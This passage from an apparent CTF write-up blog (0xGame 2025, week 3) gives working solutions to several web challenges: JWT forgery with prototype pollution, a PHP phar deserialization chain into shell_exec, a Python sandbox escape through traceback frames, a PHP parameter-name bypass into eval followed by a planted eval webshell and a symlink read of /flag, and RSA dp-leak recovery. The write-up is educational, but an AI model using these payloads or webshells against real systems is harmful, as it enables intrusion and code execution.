function_">generateJWT</span>(username, password);</span><br><span class="line">    res.<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, data, &#123;<span class="attr">httpOnly</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/admin_club1st&#x27;</span>, <span class="title class_">Admin</span>_Check, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/admin_club1st&#x27;</span>, <span class="title class_">Admin</span>_Check, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> body = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">let</span> evernight = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="variable constant_">CONFIG</span>);</span><br><span class="line">    <span class="keyword">let</span> min_public_time = <span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>;</span><br><span class="line">    <span class="title function_">merge</span>(evernight, body);    </span><br><span class="line">    <span class="keyword">let</span> en = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="variable constant_">CONFIG</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (en.<span class="property">min_public_time</span> &lt; <span class="string">&quot;2025-08-03&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;march7th&#x27;</span>, &#123;<span class="attr">message</span>: <span class="variable constant_">FLAG</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;evernight&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/trailblazer&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;trailblazer&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Failed Amphoreus&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server is running on port 80&#x27;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">有个merge，应该是污染en.<span class="property">min_public_time</span></span><br><span class="line"> <span class="keyword">if</span> (en.<span class="property">min_public_time</span> &lt; <span class="string">&quot;2025-08-03&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;march7th&#x27;</span>, &#123;<span class="attr">message</span>: <span class="variable constant_">FLAG</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">还有个token验证</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Check</span>(<span class="params">token</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!token)&#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> data = jwt.<span class="title function_">decode</span>(token);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(data.<span class="property">username</span> === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们那开始操作吧，注册用户，登入一次，抓包看token，然后用户的token改为admin</p>
<img src="/2025/10/29/0xgame2025%20%EF%BC%88week3/9baa210f-f244-4946-ae71-68b7415dcfad-20251030214816-1bskecx.png" class="" title="web2解题过程截图">

<p>我们再用我们修改的token登入我们的账号</p>
<img src="/2025/10/29/0xgame2025%20%EF%BC%88week3/5b39bd9c-82fc-4381-97ce-afa5adbf2aa8-20251030214951-q8kku28.png" class="" title="web2解题过程截图">

<p>跟随重定向来到<img src="/2025/10/29/0xgame2025%20%EF%BC%88week3/e8a61f79-72f8-44c1-8156-be9353ce0629-20251030215022-o6s0se7.png" class="" title="web2解题过程截图"></p>
<p>后面就是污染en.min_public_time</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;name&quot;</span>:<span class="string">&quot;EverNight&quot;</span>,</span><br><span class="line"> <span class="string">&quot;default_path&quot;</span>:<span class="string">&quot;The Remembrance&quot;</span>,</span><br><span class="line"> <span class="string">&quot;place&quot;</span>:<span class="string">&quot;Amphoreus&quot;</span>,</span><br><span class="line"> <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line"> <span class="string">&quot;min_public_time&quot;</span>:<span class="string">&quot;2024-08-032&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2025/10/29/0xgame2025%20%EF%BC%88week3/3e685fab-277e-4f0d-a11e-389d0fc0e021-20251030215447-kqjgyju.png" class="" title="web2解题过程截图">

<h2 id="文件查询器（蓝）"><a href="#文件查询器（蓝）" class="headerlink" title="文件查询器（蓝）"></a>文件查询器（蓝）</h2><p>有个查询功能和文件上传功能</p>
<p>我们F12一下发现了这个</p>
<img src="/2025/10/29/0xgame2025%20%EF%BC%88week3/6993cff6-a99d-4051-9a0e-52730854fda4-20251029092834-pkuhi6p.png" class="" title="web2解题过程截图">

<p>我们查询一下upload.php和index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$White_List</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;pdf&quot;</span>);</span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$White_List</span>)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">    <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">gettype</span>(<span class="variable">$pos</span>)===<span class="string">&quot;integer&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你猜我想让你干什么喵&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; Already exists. &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123; </span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="variable">$content</span>); </span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Success ./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;请重新尝试喵&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaHaYu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HG2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ToT</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$FM2tM</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span> -&gt; <span class="title function_ invoke__">ZombiegalKawaii</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ZombiegalKawaii</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="variable">$HG2</span> = <span class="variable language_">$this</span> -&gt; HG2;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|print|readfile|get|assert|passthru|nl|flag|ls|scandir|check|cat|tac|echo|eval|rev|report|dir/i&quot;</span>,<span class="variable">$HG2</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这这这你也该绕过去了吧&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; ToT = <span class="string">&quot;这其实是来占位的&quot;</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="variable">$HG2</span> = <span class="variable language_">$this</span> -&gt; HG2;</span><br><span class="line">      <span class="variable">$FM2tM</span> = <span class="variable language_">$this</span> -&gt; FM2tM;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Wow&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">var_dump</span>(<span class="variable">$HG2</span>(<span class="variable">$FM2tM</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;[\$%&amp;#@*]|flag|file|base64|go|git|login|dict|base|echo|content|read|convert|filter|date|plain|text|;|&lt;|&gt;/i&quot;</span>, <span class="variable">$file</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;对方撤回了一个请求，并企图萌混过关&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然过滤了很多函数但是我们慢慢看就会发现<code>shell_exec()</code>没被过滤</p>
<p>然后我们看到<code>file_get_contents</code>​和<code>__HALT_COMPILER();</code>，一眼phar了</p>
<p>然后拿板子改</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MaHaYu</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$HG2</span> = <span class="string">&quot;shell_exec&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$ToT</span> = <span class="string">&quot;11111&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$FM2tM</span> = <span class="string">&quot;env&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">MaHaYu</span>();</span><br><span class="line"> <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"> <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"> <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"> <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"> <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"> <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>因为要绕过$pos &#x3D; strpos($content, “__HALT_COMPILER();”);的检查，我们直接php生成</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&quot;file_put_contents(&#x27;phar.png&#x27;, gzencode(file_get_contents(&#x27;phar.phar&#x27;)));&quot;</span></span><br><span class="line">//然后在文件查询用phar://读一下图片</span><br><span class="line">phar://./upload/phar.png</span><br></pre></td></tr></table></figure>

<img src="/2025/10/29/0xgame2025%20%EF%BC%88week3/1c5a85af-d9d3-4455-954e-a2bd33ceaa2e-20251030195356-r75d28k.png" class="" title="web2解题过程截图">

<h2 id="消栈逃出沙箱-1-反正不会有2"><a href="#消栈逃出沙箱-1-反正不会有2" class="headerlink" title="消栈逃出沙箱(1)反正不会有2"></a>消栈逃出沙箱(1)反正不会有2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#拿到代码先让ai整理一下</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">blackchar = <span class="string">&quot;&amp;*^%#$&#123;&#125;@!~`·/&lt;&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_sandbox_Exec</span>(<span class="params">code</span>):<span class="comment">#这里限制了使用函数</span></span><br><span class="line">    whitelist = &#123;</span><br><span class="line">        <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span>: <span class="built_in">list</span>,</span><br><span class="line">        <span class="string">&quot;len&quot;</span>: <span class="built_in">len</span>,</span><br><span class="line">        <span class="string">&quot;Exception&quot;</span>: Exception</span><br><span class="line">    &#125;</span><br><span class="line">    safe_globals = &#123;<span class="string">&quot;__builtins__&quot;</span>: whitelist&#125;</span><br><span class="line">    original_stdout = sys.stdout</span><br><span class="line">    original_stderr = sys.stderr</span><br><span class="line">    sys.stdout = io.StringIO()</span><br><span class="line">    sys.stderr = io.StringIO()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(code, safe_globals)</span><br><span class="line">        output = sys.stdout.getvalue()</span><br><span class="line">        error = sys.stderr.getvalue()</span><br><span class="line">        <span class="keyword">return</span> output <span class="keyword">or</span> error <span class="keyword">or</span> <span class="string">&quot;No output&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        sys.stdout = original_stdout</span><br><span class="line">        sys.stderr = original_stderr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/check&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    data = request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;NO data&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> blackchar:</span><br><span class="line">        <span class="keyword">if</span> d <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="string">&quot;NONONO&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line">    secret = safe_sandbox_Exec(data)</span><br><span class="line">    <span class="keyword">return</span> Response(secret, status=<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">9000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们能看到这里面的函数是被限制了的，只能使用 <code>print</code>​, <code>list</code>​, <code>len</code>​, <code>Exception</code> 四个函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">whitelist = &#123;</span><br><span class="line">        <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span>: <span class="built_in">list</span>,</span><br><span class="line">        <span class="string">&quot;len&quot;</span>: <span class="built_in">len</span>,</span><br><span class="line">        <span class="string">&quot;Exception&quot;</span>: Exception</span><br><span class="line">    &#125;</span><br><span class="line">    safe_globals = &#123;<span class="string">&quot;__builtins__&quot;</span>: whitelist&#125;</span><br></pre></td></tr></table></figure>

<p>栈帧逃逸的话，这里利用的是Exception（因为留了这个），我们先用<code>__traceback__.tb_frame</code>​来获取位置然后用<code>.f_back</code>回溯</p>
<p>我们需要回溯到check路由，回溯路径的话就是</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"> int(&#x27;&#x27;)</span><br><span class="line">    ↓ f_back （第一层</span><br><span class="line">safe_sandbox_Exec </span><br><span class="line">    ↓ f_back  (第二层</span><br><span class="line">  /check  </span><br></pre></td></tr></table></figure>

<p>比较清晰了</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&#x27;http://9000-f4b6ca11-8673-4c01-8826-061cad6484d7.challenge.ctfplus.cn/check&#x27;</span><br><span class="line">payload=&#x27;&#x27;&#x27;</span><br><span class="line">try:</span><br><span class="line">    int()</span><br><span class="line">except Exception as Xen:</span><br><span class="line">    frame=Xen.__traceback__.tb_frame.f_back.f_back</span><br><span class="line">    all=frame.f_globals[&#x27;__builtins__&#x27;]</span><br><span class="line">    output=all.__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()</span><br><span class="line">    print(output)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">res=requests.post(url, data=&#123;&quot;data&quot;: payload&#125;)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<h2 id="放开我的变量"><a href="#放开我的变量" class="headerlink" title="放开我的变量"></a>放开我的变量</h2><p>一个博客页面，我们先扫了再说</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[22:21:09] 301 -   48B  - /debug/pprof  -&gt;  /debug/pprof/                   </span><br><span class="line">[22:21:09] 200 -    3KB - /debug/pprof/                                     </span><br><span class="line">[22:21:09] 200 -    8KB - /debug/pprof/goroutine?debug=1                    </span><br><span class="line">[22:21:09] 200 -   33KB - /debug/pprof/heap                                 </span><br><span class="line">[22:21:10] 200 -   51KB - /debug/pprof/trace                                </span><br><span class="line">[22:21:11] 200 -   65B  - /health                                           </span><br><span class="line">[22:21:15] 200 -  128B  - /metrics                                          </span><br><span class="line">[22:21:18] 200 -    2B  - /ping                                             </span><br><span class="line">[22:21:20] 200 -  117B  - /robots.txt </span><br></pre></td></tr></table></figure>

<p>我们查看robots.txt发现<code>/asdback.php</code>路由</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">echo(&quot;Please Input Your CMD&quot;);</span><br><span class="line">$cmd = $_POST[&#x27;__0xGame2025phpPsAux&#x27;];</span><br><span class="line">eval($cmd);</span><br><span class="line">?&gt; Please Input Your CMD</span><br></pre></td></tr></table></figure>

<p>php非法参数名传参解析<br>当<code>PHP版本小于8</code>​时，如果参数中出现中括号<code>[</code>​，中括号会被转换成下划线<code>_</code>​，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>​并不会继续转换成下划线<code>_</code>​，也就是说如果中括号<code>[</code>​出现在前面，那么中括号<code>[</code>​还是会被转换成下划线<code>_</code>​，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p>
<p>我们直接用<code>_[0xGame2025phpPsAux=system(&quot;ls /&quot;);</code>,发现flag,但是无法访问,猜是权限不够,我们写马连一下蚁剑</p>
<p>​<code>_[0xGame2025phpPsAux=file_put_contents(&#39;1.php&#39;, &#39;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#39;);</code></p>
<p>sudo没用我们看看ps -aux,发现start.sh有root权限,我们看看是啥玩意</p>
<img src="/2025/10/29/0xgame2025%20%EF%BC%88week3/ce3f81a4-e02a-471c-b5d1-ed40a5d11130-20251108224114-37eumyp.png" class="" title="web2解题过程截图">我们看看这玩意是什么

<img src="/2025/10/29/0xgame2025%20%EF%BC%88week3/a9e987a6-1532-4698-a9a0-db568d10295f-20251108230430-97uw0he.png" class="" title="web2解题过程截图">

<p>每 5 秒钟将 <code>/var/www/html/primary</code>​ 目录中的所有文件复制到 <code>/var/www/html/marstream/</code>​ 目录，并设置复制后文件的权限为 <code>755</code></p>
<p>那我们</p>
<p><a href="https://infernity.top/2025/02/12/N1CTF2025/#backup">N1CTF junior 2025 Web wp - Infernity&apos;s Blog</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> primary</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; -H   <span class="comment">#或者 touch -- -H   //--的作用是不解析后面的参数</span></span><br><span class="line"><span class="built_in">ln</span> -s /flag abc</span><br><span class="line"><span class="built_in">cat</span> /var/www/html/marstream/abc</span><br></pre></td></tr></table></figure>

<h2 id="New-Python"><a href="#New-Python" class="headerlink" title="New_Python!"></a>New_Python!</h2><p>注册进入获得代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过RSA得到UUID8的a</span></span><br><span class="line"><span class="comment"># 再通过其他方式获取到b和c</span></span><br><span class="line"><span class="comment"># 利用UUID8生成Admin密码</span></span><br><span class="line"></span><br><span class="line">msg= <span class="string">b&#x27;&#x27;</span></span><br><span class="line">BITS = <span class="number">1024</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p = getPrime(BITS//<span class="number">2</span>)</span><br><span class="line">q = getPrime(BITS//<span class="number">2</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(invert(e, phi))</span><br><span class="line"></span><br><span class="line">key = bytes_to_long(msg)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(key, e, n)</span><br><span class="line"></span><br><span class="line">dp = d % (p - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&quot;n = &quot;, n)</span></span><br><span class="line"><span class="comment">#print(&quot;e = &quot;, e)</span></span><br><span class="line"><span class="comment">#print(&quot;c = &quot;, c)</span></span><br><span class="line"><span class="comment">#print(&quot;dp = &quot;, dp)</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;</span> <span class="comment">#&#123;&#125;内的</span></span><br><span class="line">key = key.encode()</span><br><span class="line">key = <span class="built_in">int</span>.from_bytes(key, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">pa = uuid.uuid8(a=key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = 70344167219256641077015681726175134324347409741986009928113598100362695146547483021742911911881332309275659863078832761045042823636229782816039860868563175749260312507232007275946916555010462274785038287453018987580884428552114829140882189696169602312709864197412361513311118276271612877327121417747032321669</span></span><br><span class="line"><span class="comment">#e =  65537</span></span><br><span class="line"><span class="comment">#c =  46438476995877817061860549084792516229286132953841383864271033400374396017718505278667756258503428019889368513314109836605031422649754190773470318412332047150470875693763518916764328434140082530139401124926799409477932108170076168944637643580876877676651255205279556301210161528733538087258784874540235939719</span></span><br><span class="line"><span class="comment">#dp =  7212869844215564350030576693954276239751974697740662343345514791420899401108360910803206021737482916742149428589628162245619106768944096550185450070752523</span></span><br></pre></td></tr></table></figure>

<p>a通过rsa获得</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知参数</span></span><br><span class="line">n = <span class="number">70344167219256641077015681726175134324347409741986009928113598100362695146547483021742911911881332309275659863078832761045042823636229782816039860868563175749260312507232007275946916555010462274785038287453018987580884428552114829140882189696169602312709864197412361513311118276271612877327121417747032321669</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">46438476995877817061860549084792516229286132953841383864271033400374396017718505278667756258503428019889368513314109836605031422649754190773470318412332047150470875693763518916764328434140082530139401124926799409477932108170076168944637643580876877676651255205279556301210161528733538087258784874540235939719</span></span><br><span class="line">dp = <span class="number">7212869844215564350030576693954276239751974697740662343345514791420899401108360910803206021737482916742149428589628162245619106768944096550185450070752523</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始爆破</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span> (e * dp - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">        p_candidate = (e * dp - <span class="number">1</span>) // k + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n % p_candidate == <span class="number">0</span>:</span><br><span class="line">            p = p_candidate</span><br><span class="line">            q = n // p</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">plaintext = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;明文:&quot;</span>, plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment">#key&#123;rsaisfunbutisitweborcrypto&#125;</span></span><br></pre></td></tr></table></figure>

